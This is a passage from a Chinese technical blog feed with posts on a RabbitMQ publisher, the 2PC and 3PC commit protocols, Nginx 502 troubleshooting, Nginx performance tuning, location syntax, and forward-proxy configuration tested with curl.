i++) &#123;</span><br><span class="line">            String routingKey = routing_keys[i];</span><br><span class="line">            String message = messages[i];</span><br><span class="line">            channel.basicPublish(EXCHANGE_NAME, routingKey, <span class="keyword">null</span>, message</span><br><span class="line">                    .getBytes());</span><br><span class="line">            System.out.printf(<span class="string">"发送消息到路由：%s, 内容是: %s%n "</span>, routingKey,message);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭通道和连接</span></span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h4><p><img src="RabbitMQ_9.png" alt=""></p><p>Demo代码可以 Email 联系我。</p>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> MessageQueue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2PC And 3PC</title>
      <link href="/2019/11/03/2PC-And-3PC/"/>
      <url>/2019/11/03/2PC-And-3PC/</url>
      
        <content type="html"><![CDATA[<h2 id="2PC——二阶段提交"><a href="#2PC——二阶段提交" class="headerlink" title="2PC——二阶段提交"></a>2PC——二阶段提交</h2><blockquote><p>分布式数据要尽可能保证一致性，2PC即二阶段提交就是保证数据一致性的一种手段。</p></blockquote><p>在分布式系统中，每个节点虽然可以知晓自己的操作时成功或者失败，却无法知道其他节点的操作的成功或失败。<br>当一个事务跨越多个节点时，为了保持事务的ACID特性，需要引入一个作为协调者的组件来统一掌控所有参与者的操作结果并最终指示这些节点是否要把操作结果进行真正的提交。<br>因此，二阶段提交的算法思路可以概括为：参与者将操作成败通知协调者，再由协调者根据所有参与者的反馈情报决定各参与者是否要提交操作还是中止操作。</p><p>所谓的两个阶段是指：第一阶段：准备阶段和第二阶段：提交阶段</p><h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><p>事务协调者给每个参与者发送Prepare消息，每个参与者要么直接返回失败，要么在本地执行事务，但不提交。<br>可以进一步将准备阶段分为以下三个步骤：</p><ul><li>1）协调者节点向所有参与者节点询问是否可以执行提交操作，并开始等待各参与者节点的响应。</li><li>2）参与者节点执行询问发起为止的所有事务操作，并将Undo信息和Redo信息写入日志。</li><li>3）各参与者节点响应协调者节点发起的询问。如果参与者节点的事务操作实际执行成功，则它返回一个”同意”消息；如果参与者节点的事务操作实际执行失败，则它返回一个”中止”消息。</li></ul><p><img src="2PC%E4%B8%8E3PC_1.png" alt=""></p><h3 id="提交阶段"><a href="#提交阶段" class="headerlink" title="提交阶段"></a>提交阶段</h3><p>如果协调者收到了参与者的失败消息或者超时，直接给每个参与者发送回滚消息；否则，发送提交消息；参与者根据协调者的指令执行提交或者回滚操作。<br>接下来分两种情况分别讨论提交阶段的过程。</p><ul><li>1）当协调者节点从所有参与者节点获得的相应消息都为”同意”时:</li></ul><p><img src="2PC%E4%B8%8E3PC_2.png" alt=""></p><ol><li>协调者节点向所有参与者节点发出”正式提交”的请求。</li><li>参与者节点正式完成操作，并释放在整个事务期间内占用的资源。</li><li>参与者节点向协调者节点发送”完成”消息</li><li>协调者节点受到所有参与者节点反馈的”完成”消息后，完成事务。</li></ol><ul><li>2）如果任一参与者节点在第一阶段返回的响应消息为”中止”，或者 协调者节点在第一阶段的询问超时之前无法获取所有参与者节点的响应消息时：</li></ul><p><img src="2PC%E4%B8%8E3PC_3.png" alt=""></p><ol><li>协调者节点向所有参与者节点发出”回滚操作”的请求。</li><li>参与者节点利用之前写入的Undo信息执行回滚，并释放在整个事务期间内占用的资源。</li><li>参与者节点向协调者节点发送”回滚完成”消息。</li><li>协调者节点受到所有参与者节点反馈的”回滚完成”消息后，取消事务。</li></ol><h3 id="2PC-的缺点"><a href="#2PC-的缺点" class="headerlink" title="2PC 的缺点"></a>2PC 的缺点</h3><ol><li>同步阻塞问题。执行过程中，所有参与节点都是事务阻塞型的。当参与者占有公共资源时，其他第三方节点访问公共资源不得不处于阻塞状态。（当参与者收到组织者的消息之后，需要登录游戏，在游戏中等待组织者的再次邀请，这个过程比较浪费时间。）</li><li>单点故障。由于协调者的重要性，一旦协调者发生故障。参与者会一直阻塞下去。尤其在第二阶段，协调者发生故障，那么所有的参与者还都处于锁定事务资源的状态中，而无法继续完成事务操作。（如果是协调者挂掉，可以重新选举一个协调者，但是无法解决因为协调者宕机导致的参与者处于阻塞状态的问题）</li><li>数据不一致。在二阶段提交的阶段二中，当协调者向参与者发送commit请求之后，发生了局部网络异常或者在发送commit请求过程中协调者发生了故障，这回导致只有一部分参与者接受到了commit请求。而在这部分参与者接到commit请求之后就会执行commit操作。但是其他部分未接到commit请求的机器则无法执行事务提交。于是整个分布式系统便出现了数据部一致性的现象。</li><li>二阶段无法解决的问题：协调者再发出commit消息之后宕机，而唯一接收到这条消息的参与者同时也宕机了。那么即使协调者通过选举协议产生了新的协调者，这条事务的状态也是不确定的，没人知道事务是否被已经提交。</li></ol><p>为了解决以上缺点就有了3PC</p><h2 id="3PC——三阶段提交"><a href="#3PC——三阶段提交" class="headerlink" title="3PC——三阶段提交"></a>3PC——三阶段提交</h2><blockquote><p>所谓3PC，就是把2PC的准备阶段再次一分为二，组成了三阶段。<br>3PC并没彻底解决2PC存在的所有问题</p></blockquote><details><summary> 2PC举例 </summary>组织者：小A，我们准备玩王者荣耀，你要是可以来参加的话，现在你就登录游戏，然后在游戏好友上给我回复个消息。<p>小A登录自己的游戏账号，然后告诉组织者：小A已就位。</p><p>组织者：小B、小C、小D，我们准备玩王者荣耀，你要是可以来参加的话，现在你就登录游戏，然后在游戏好友上给我回复个消息。</p><p>小B、小C、小D分别登录自己的游戏账号，然后告诉组织者：小B、小C、小D已就位。</p><p>组织者发现所有人都就位了，于是在游戏上逐一通知大家，</p><p>组织者：小A，我邀请你了，你进来吧。</p><p>小A接受邀请</p><p>组织者：小B、小C、小D，我邀请你了，你进来吧。</p><p>小小B、小C、小D接收邀请</p></details><details><summary> 3PC举例 </summary>组织者：小A，我们想定在晚上8点，你有时间嘛？有时间你就说YES，没有你就说NO，然后我还会再去问其他人，这段时间你可先去干你自己的事儿，不用一直等着我。<p>小A：好的，我有时间。</p><p>组织者：小B、小C、小D，我们想定在晚上8点王者荣耀五黑……不用一直等我。</p><p>组织者收集完大家的时间情况了，一看大家都有时间，那么就再次通知大家。（协调者接收到所有YES指令）</p><p>组织者：小A，我们确定了晚上8点王者荣耀五黑，你要把段时间空出来，你不能再安排其他的事儿了。然后我会逐个通知其他朋友，通知完之后我会再来和你确认一下，还有啊，如果我没有特意给你打电话，你就8点上号就行了。对了，你确定能来是吧？</p><p>小A顺手设置了晚上8点闹钟，然后跟组织者说，我可以去。</p><p>组织者：小B，我们决定了晚上8点王者荣耀五黑……你就8点上号就行了。</p><p>组织者通知完一圈之后。所有朋友都跟他说：”我已经把8点这个时间段空出来了”。于是，他在8点的时候这一天又挨个打了一遍电话告诉他们：嘿，现在你们可以上号啦。。。。</p><p>小A、小B、小C、小D：我已经登录了，你拉我吧。</p><p>组织者邀请A、B、C等加入游戏。</p></details><p>和2PC相比，3PC多了一个步骤，就是提前询问所以参与者是否都能参与，并且所有人都同意后再次通知大家登录游戏。</p><p>在第一阶段，只是询问所有参与者是否可以执行事务操作，并不在本阶段执行事务操作。当协调者收到所有的参与者都返回YES时，在第二阶段才执行事务操作，然后在第三阶段在执行commit或者rollback。</p><p>这样三阶段提交就有CanCommit（事务询问）、PreCommit（事务执行）、DoCommit（事务提交）三个阶段。</p><h3 id="CanCommit阶段"><a href="#CanCommit阶段" class="headerlink" title="CanCommit阶段"></a>CanCommit阶段</h3><p>3PC的CanCommit阶段其实和2PC的准备阶段很像。协调者向参与者发送commit请求，参与者如果可以提交就返回Yes响应，否则返回No响应。</p><p><img src="2PC%E4%B8%8E3PC_4.png" alt=""><br>1、事务询问：协调者向参与者发送CanCommit请求。询问是否可以执行事务提交操作。然后开始等待参与者的响应。</p><p>2、响应反馈：参与者接到CanCommit请求之后，正常情况下，如果其自身认为可以顺利执行事务，则返回YES响应，并进入预备状态。否则反馈NO</p><h3 id="PreCommit阶段"><a href="#PreCommit阶段" class="headerlink" title="PreCommit阶段"></a>PreCommit阶段</h3><p>协调者根据CanCommit阶段参与者的反应情况来决定是否可以进行事务的PreCommit操作。<br>假如协调者从所有的参与者获得的反馈都是YES响应，那么就会执行事务的预执行：</p><p><img src="2PC%E4%B8%8E3PC_5.png" alt=""><br>1、发送预提交请求：协调者向参与者发送PreCommit请求，并进入Prepared阶段。</p><p>2、事务预提交：参与者接收到PreCommit请求后，会执行事务操作，并将undo和redo信息记录到事务日志中。</p><p>3、响应反馈：如果参与者成功的执行了事务操作，则返回ACK响应，同时开始等待最终指令。</p><p>假如有任何一个参与者向协调者发送了NO响应，或者等待超时之后，协调者都没有接到参与者的响应，那么就执行事务的中断。</p><p><img src="2PC%E4%B8%8E3PC_6.png" alt=""><br>1、发送中断请求：协调者向所有参与者发送abort请求。</p><p>2、中断事务：参与者收到来自协调者的abort请求之后（或超时之后，仍未收到协调者的请求），执行事务的中断。</p><h3 id="doCommit阶段"><a href="#doCommit阶段" class="headerlink" title="doCommit阶段"></a>doCommit阶段</h3><p>该阶段进行真正的事务提交，也可以分为以下两种情况。<br>如果协调证收到所有参与者的事务执行后的ACK响应，则发生如下事情：</p><p><img src="2PC%E4%B8%8E3PC_7.png" alt=""><br>1、发送提交请求：协调接收到参与者发送的ACK响应，那么他将从预提交状态进入到提交状态。并向所有参与者发送doCommit请求。</p><p>2、事务提交：参与者接收到doCommit请求之后，执行正式的事务提交。并在完成事务提交之后释放所有事务资源。</p><p>3、响应反馈：事务提交完之后，向协调者发送Ack响应。</p><p>4、完成事务：协调者接收到所有参与者的ack响应之后，完成事务。</p><p>如果协调者没有接收到参与者发送的ACK响应（可能是接受者发送的不是ACK响应，也可能响应超时），那么就会执行中断事务。</p><p><img src="2PC%E4%B8%8E3PC_8.png" alt=""><br>1、发送中断请求：协调者向所有参与者发送abort请求</p><p>2、事务回滚：参与者接收到abort请求之后，利用其在阶段二记录的undo信息来执行事务的回滚操作，并在完成回滚之后释放所有的事务资源。</p><p>3、反馈结果：参与者完成事务回滚之后，向协调者发送ACK消息</p><p>4、中断事务：协调者接收到参与者反馈的ACK消息之后，执行事务的中断。</p><p>还有一种情况，如果参与者无法及时接收到来自协调者的doCommit或者abort请求时，会在等待超时之后，会继续进行事务的提交。</p><p><img src="2PC%E4%B8%8E3PC_9.png" alt=""></p><h2 id="3PC比2PC好在哪？"><a href="#3PC比2PC好在哪？" class="headerlink" title="3PC比2PC好在哪？"></a>3PC比2PC好在哪？</h2><h3 id="降低同步阻塞"><a href="#降低同步阻塞" class="headerlink" title="降低同步阻塞"></a>降低同步阻塞</h3><p>在3PC中，第一阶段并没有让参与者直接执行事务，而是在第二阶段才会让参与者进行事务的执行。大大降低了阻塞的概率和时长。并且，在3PC中，如果参与者未收到协调者的消息，那么他会在等待一段时间后自动执行事务的commit，而不是一直阻塞。</p><h3 id="提升了数据一致性"><a href="#提升了数据一致性" class="headerlink" title="提升了数据一致性"></a>提升了数据一致性</h3><p>2PC中有一种情况会导致数据不一致，如在2PC的阶段二中，当协调者向参与者发送commit请求之后，发生了网络异常，只有一部分参与者接受到了commit请求。而在这部分参与者接到commit请求之后就会执行commit操作。但是其他部分未接到commit请求的机器则无法执行事务提交。于是整个分布式系统便出现了数据不一致性的现象。</p><p>这种情况在3PC的场景中得到了很好的解决，因为在3PC中，如果参与者没有收到协调者的消息时，他不会一直阻塞，过一段时间之后，他会自动执行事务。这就解决了那种协调者发出commit之后。</p><p>另外，2PC还有个问题无法解决。那就是协调者再发出commit消息之后宕机，而唯一接收到这条消息的参与者同时也宕机了。那么即使协调者通过选举协议产生了新的协调者，这条事务的状态也是不确定的，没人知道事务是否被已经提交。</p><p>这种情况在3PC中是有办法解决的，因为在3PC中，选出新的协调者之后，他可以咨询所有参与者的状态，如果有某一个处于commit状态或者prepare-commit状态，那么他就可以通知所有参与者执行commit，否则就通知大家rollback。因为3PC的第三阶段一旦有机器执行了commit，那必然第一阶段大家都是同意commit的，所以可以放心执行commit。</p><h2 id="3PC无法解决的问题"><a href="#3PC无法解决的问题" class="headerlink" title="3PC无法解决的问题"></a>3PC无法解决的问题</h2><p>在doCommit阶段，如果参与者无法及时接收到来自协调者的doCommit或者abort请求时，会在等待超时之后，会继续进行事务的提交。</p><p>所以，由于网络原因，协调者发送的abort响应没有及时被参与者接收到，那么参与者在等待超时之后执行了commit操作。这样就和其他接到abort命令并执行回滚的参与者之间存在数据不一致的情况。</p><p>所以，我们可以认为，无论是二阶段提交还是三阶段提交都无法彻底解决分布式的一致性问题。</p><p>Google Chubby的作者Mike Burrows说过：</p><p>there is only one consensus protocol, and that’s Paxos” – all other approaches are just broken versions of Paxos。</p><p>意即世上只有一种一致性算法，那就是Paxos，所有其他一致性算法都是Paxos算法的不完整版。</p>]]></content>
      
      
      <categories>
          
          <category> Internet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2PC </tag>
            
            <tag> 3PC </tag>
            
            <tag> transaction </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx Error</title>
      <link href="/2019/10/29/Nginx-Error/"/>
      <url>/2019/10/29/Nginx-Error/</url>
      
        <content type="html"><![CDATA[<h2 id="502报错"><a href="#502报错" class="headerlink" title="502报错"></a>502报错</h2><h3 id="FastCGI相关"><a href="#FastCGI相关" class="headerlink" title="FastCGI相关"></a>FastCGI相关</h3><ol><li>FastCGI进程是否已经启动</li><li>FastCGI worker进程数是否不够</li><li>FastCGI执行时间过长</li><li>FastCGI Buffer不够<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nginx和apache一样，有前端缓冲限制，可以调整缓冲参数</span><br><span class="line">fastcgi_buffer_size 32k;</span><br><span class="line">fastcgi_buffers 8 32k;</span><br></pre></td></tr></table></figure><h3 id="Proxy-Buffer不够"><a href="#Proxy-Buffer不够" class="headerlink" title="Proxy Buffer不够"></a>Proxy Buffer不够</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果你用了Proxying，调整</span><br><span class="line">proxy_buffer_size 16k;</span><br><span class="line">proxy_buffers 4 16k;</span><br></pre></td></tr></table></figure><h3 id="php脚本执行时间过长"><a href="#php脚本执行时间过长" class="headerlink" title="php脚本执行时间过长"></a>php脚本执行时间过长</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将php-fpm.conf的</span><br><span class="line">&lt;value name&#x3D;&quot;request_terminate_timeout&quot;&gt;0s&lt;&#x2F;value&gt;</span><br><span class="line">0s改成一个时间</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx Optimization</title>
      <link href="/2019/10/20/Nginx-Optimization/"/>
      <url>/2019/10/20/Nginx-Optimization/</url>
      
        <content type="html"><![CDATA[<h4 id="调整-worker-processes"><a href="#调整-worker-processes" class="headerlink" title="调整 worker_processes"></a>调整 worker_processes</h4><p>指Nginx要生成的worker数量，最佳实践是每个CPU运行1个工作进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 了解系统中的CPU核心数，输入：</span><br><span class="line">$ grep processor &#x2F; proc &#x2F; cpuinfo | wc -l</span><br></pre></td></tr></table></figure><h4 id="最大化worker-connections"><a href="#最大化worker-connections" class="headerlink" title="最大化worker_connections"></a>最大化worker_connections</h4><p>Nginx Web服务器可以同时提供服务的客户端数。与worker_processes结合使用时，获得每秒可以服务的最大客户端数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">单个进程的连接数（文件描述符 fd）</span><br><span class="line">最大客户端数&#x2F;秒&#x3D;工作进程*工作者连接数</span><br><span class="line">为了最大化Nginx的全部潜力，应将工作者连接设置为核心一次可以运行的允许的最大进程数1024。</span><br><span class="line">上面是 Nginx 作为通用服务器时，最大的连接数。</span><br><span class="line">Nginx 作为反向代理服务器时，能够服务的最大连接数要除以2</span><br><span class="line">因为 Nginx 反向代理时，会建立 Client 的连接和后端 Web Server 的连接，占用 2 个连接</span><br></pre></td></tr></table></figure><h4 id="启用Gzip文件压缩"><a href="#启用Gzip文件压缩" class="headerlink" title="启用Gzip文件压缩"></a>启用Gzip文件压缩</h4><p>如果我们租用了一个带宽很低的服务器，网站访问速度会很慢，这时我们可以通过让nginx开启GZIP压缩来提高网站的访问速度。（压缩文件大小，减少了客户端http的传输带宽，因此提高了页面加载速度）</p><ul><li>首先我们对nginx进行限速操作，限制每个连接的访问速度为128K来建立一个比较慢的访问场景；</li><li>修改mall.conf配置文件，进行限速操作：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  mall.macrozheng.com;</span><br><span class="line">    limit_rate 128k; #限制网速为128K</span><br><span class="line"></span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;mall;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">    location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>对mall的前端项目mall.macrozheng.com进行访问，我们可以发现网站中有个js文件比较大，需要加载12s<br><img src="Nginx_3.png" alt=""></li><li>nginx返回请求头信息如下：<br><img src="Nginx_4.png" alt=""></li><li>修改/mydata/nginx/conf目录下的nginx.conf配置文件，开启GZIP压缩<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    gzip on; #开启gzip</span><br><span class="line">    gzip_disable &quot;msie6&quot;; #IE6不使用gzip</span><br><span class="line">    gzip_vary on; #设置为on会在Header里增加 &quot;Vary: Accept-Encoding&quot;</span><br><span class="line">    gzip_proxied any; #代理结果数据的压缩</span><br><span class="line">    gzip_comp_level 6; #gzip压缩比（1~9），越小压缩效果越差，但是越大处理越慢，所以一般取中间值</span><br><span class="line">    gzip_buffers 16 8k; #获取多少内存用于缓存压缩结果</span><br><span class="line">    gzip_http_version 1.1; #识别http协议的版本</span><br><span class="line">    gzip_min_length 1k; #设置允许压缩的页面最小字节数，超过1k的文件会被压缩</span><br><span class="line">    gzip_types application&#x2F;javascript text&#x2F;css text&#x2F;plain application&#x2F;json; #对特定的MIME类型生效,js和css文件会被压缩</span><br><span class="line"></span><br><span class="line">    include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>再次对mall的前端项目mall.macrozheng.com进行访问，我们可以发现js文件已经被压缩，加载时间缩短到3.88s，提速3倍左右<br><img src="Nginx_5.png" alt=""></li><li>nginx返回请求头中添加了Content-Encoding: gzip的信息<br><img src="Nginx_6.png" alt=""><h4 id="为静态文件启用缓存"><a href="#为静态文件启用缓存" class="headerlink" title="为静态文件启用缓存"></a>为静态文件启用缓存</h4>为静态文件启用缓存，以减少带宽并提高性能，可以添加下面的命令，限定计算机缓存网页的静态文件：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~* .(jpg|jpeg|png|gif|ico|css|js)$ &#123;</span><br><span class="line">expires 365d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~* .(jpg|jpeg|png|gif|ico|css|js)$ &#123;</span><br><span class="line">add_header Cache-Control no-cache;</span><br><span class="line">add_header Cache-Control private; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Timeouts"><a href="#Timeouts" class="headerlink" title="Timeouts"></a>Timeouts</h4>keepalive连接减少了打开和关闭连接所需的CPU和网络开销，获得最佳性能需要调整的变量可参考：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">client_body_timeout 12;</span><br><span class="line">client_header_timeout 12;</span><br><span class="line">keepalive_timeout 15;</span><br><span class="line">send_timeout 10;</span><br></pre></td></tr></table></figure><h4 id="禁用access-logs"><a href="#禁用access-logs" class="headerlink" title="禁用access_logs"></a>禁用access_logs</h4><blockquote><p>访问日志记录，它记录每个nginx请求，因此消耗了大量CPU资源，从而降低了nginx性能。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 完全禁用访问日志记录</span><br><span class="line">access_log off;</span><br><span class="line"></span><br><span class="line"># 如果必须具有访问日志记录，则启用访问日志缓冲</span><br><span class="line">access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx Syntax</title>
      <link href="/2019/10/09/Nginx-Syntax/"/>
      <url>/2019/10/09/Nginx-Syntax/</url>
      
        <content type="html"><![CDATA[<h2 id="Location语法规则"><a href="#Location语法规则" class="headerlink" title="Location语法规则"></a>Location语法规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location [ &#x3D; | ~ | ~* | ^~ ] uri &#123; ... &#125;</span><br><span class="line">location @name &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">&#x3D; 表示精确匹配。只有请求的url路径与后面的字符串完全相等时，才会命中。</span><br><span class="line">~ 表示该规则是使用正则定义的，区分大小写。</span><br><span class="line">~* 表示该规则是使用正则定义的，不区分大小写。</span><br><span class="line">^~ 表示如果该符号后面的字符是最佳匹配，采用该规则，不再进行后续的查找。</span><br></pre></td></tr></table></figure><h2 id="if-判断规则"><a href="#if-判断规则" class="headerlink" title="if 判断规则"></a>if 判断规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、正则表达式匹配：</span><br><span class="line">&#x3D;&#x3D;:等值比较;</span><br><span class="line">~：与指定正则表达式模式匹配时返回“真”，判断匹配与否时区分字符大小写；</span><br><span class="line">~*：与指定正则表达式模式匹配时返回“真”，判断匹配与否时不区分字符大小写；</span><br><span class="line">!~：与指定正则表达式模式不匹配时返回“真”，判断匹配与否时区分字符大小写；</span><br><span class="line">!~*：与指定正则表达式模式不匹配时返回“真”，判断匹配与否时不区分字符大小写；</span><br><span class="line"></span><br><span class="line">2、文件及目录匹配判断：</span><br><span class="line">-f, !-f：判断指定的路径是否为存在且为文件；</span><br><span class="line">-d, !-d：判断指定的路径是否为存在且为目录；</span><br><span class="line">-e, !-e：判断指定的路径是否存在，文件或目录均可；</span><br><span class="line">-x, !-x：判断指定路径的文件是否存在且可执行；</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>What Can Nginx Do and How to Use Nginx</title>
      <link href="/2019/10/05/What-Can-Nginx-Do-and-How-to-Use-Nginx/"/>
      <url>/2019/10/05/What-Can-Nginx-Do-and-How-to-Use-Nginx/</url>
      
        <content type="html"><![CDATA[<h3 id="正向代理服务器"><a href="#正向代理服务器" class="headerlink" title="正向代理服务器"></a>正向代理服务器</h3><p>被代理角色通过代理访问目标角色完成一些任务的过程称为代理操作过程。</p><blockquote><p>正向代理最大的特点是客户端非常明确要访问的服务器地址；服务器只清楚请求来自哪个代理服务器，而不清楚来自哪个具体的客户端；正向代理模式屏蔽或者隐藏了真实客户端信息。</p></blockquote><h4 id="正向代理的作用"><a href="#正向代理的作用" class="headerlink" title="正向代理的作用"></a>正向代理的作用</h4><p>（1）访问原来无法访问的资源，如Google，或者局域网中的客户端不能直接访问Internet，则需要通过代理服务器来访问<br>（2）可以做缓存，加速访问资源<br>（3）对客户端访问授权，上网进行认证<br>（4）代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息</p><h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># 代理 http</span><br><span class="line">server &#123;</span><br><span class="line">  resolver 192.168.34.3; # 指定DNS服务器IP地址</span><br><span class="line">  listen 2020; # 供请求代理的客户端访问的端口</span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;$http_host$request_uri; # 设定代理服务器的协议和地址</span><br><span class="line">    proxy_set_header HOST $http_host;</span><br><span class="line">    proxy_buffers 256 4k;</span><br><span class="line">    proxy_max_temp_file_size 0k;</span><br><span class="line">    proxy_connect_timeout 30;</span><br><span class="line">    proxy_send_timeout 60;</span><br><span class="line">    proxy_read_timeout 60;</span><br><span class="line">    proxy_next_upstream error timeout invalid_header http_502;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 代理 https</span><br><span class="line">server &#123;</span><br><span class="line">  resolver 192.168.34.3; # 指定DNS服务器IP地址务器IP地址</span><br><span class="line">  listen 2021; # 供请求代理的客户端访问的端口</span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass https:&#x2F;&#x2F;$http_host$request_uri; #设定代理服务器的协议和地址</span><br><span class="line">    proxy_set_header HOST $http_host;</span><br><span class="line">    proxy_buffers 256 4k;</span><br><span class="line">    proxy_max_temp_file_size 0k;</span><br><span class="line">    proxy_connect_timeout 30;</span><br><span class="line">    proxy_send_timeout 60;</span><br><span class="line">    proxy_read_timeout 60;</span><br><span class="line">    proxy_next_upstream error timeout invalid_header http_502;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 访问 http</span><br><span class="line">curl -l --proxy 192.168.43.144:2020 http:&#x2F;&#x2F;www.baidu.com</span><br><span class="line"></span><br><span class="line"># 访问 https</span><br><span class="line">curl -l --proxy 192.168.43.144:2021 http:&#x2F;&#x2F;www.baidu.com</span><br><span class="line"></span><br><span class="line"># 甚至还可以在服务器上请求nginx正向代理 本服务器上被nginx反向代理的服务</span><br><span class="line">curl -l --proxy 192.168.43.144:2020 192.168.43.144:10003&#x2F;console&#x2F;service&#x2F;1&#x2F;1&#x2F;get-sys-param-info</span><br><span class="line">curl -l --proxy 192.168.43.144:2021 